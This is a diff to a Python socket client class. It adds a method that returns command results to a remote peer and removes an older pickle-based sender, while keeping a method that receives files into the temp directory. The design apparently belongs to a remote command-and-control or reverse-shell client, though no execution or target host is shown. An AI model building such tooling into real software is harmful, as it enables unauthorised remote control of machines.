@@ -9,6 +9,7 @@ HEADER_SIZE = 10
 
 CHUNK_SIZE = 4 * 1024
 END_DELIMETER = "*END_OF_FILE*"
+COMMAND_DELIMETER = "<END_OF_COMMAND>"
 
 
 class ClientConnection:
@@ -28,25 +29,6 @@ class ClientConnection:
     def send_data(self, data):
         self.data_in_bytes = bytes(data, "utf-8")
         self.socket.send(self.data_in_bytes)
-
-    def send_serialized(self, data):
-
-        cmd_dict = {"cmd_ouput": data}
-
-        pickled_data = pickle.dumps(cmd_dict)
-
-        self.data_in_bytes = bytes(f"{len(pickled_data):<{HEADER_SIZE}}", 'utf-8') + pickled_data
-        self.socket.send(self.data_in_bytes)
-
-    def receive_data_bytes(self):
-        print("[+] Receiving Files")
-        with open("image.jpeg") as file:
-            while True:
-                data = self.socket.recv(1024)
-                if not data:
-                    break
-                file.write(data)
-            print("[+] Successfully downloaded the file")
 
     def receive_file(self):
         tmp = tempfile.gettempdir()
@@ -71,6 +53,14 @@ class ClientConnection:
                     print("[-] Unable to locate file")
                     break
                 file.write(chunk)
+
+
+    def send_command_result(self, command_result):
+        print("[+] Sending Command Result")
+        chunk = command_result + COMMAND_DELIMETER
+        chunk_bytes = chunk.encode()
+
+        self.socket.sendall(chunk_bytes)
 
 
 
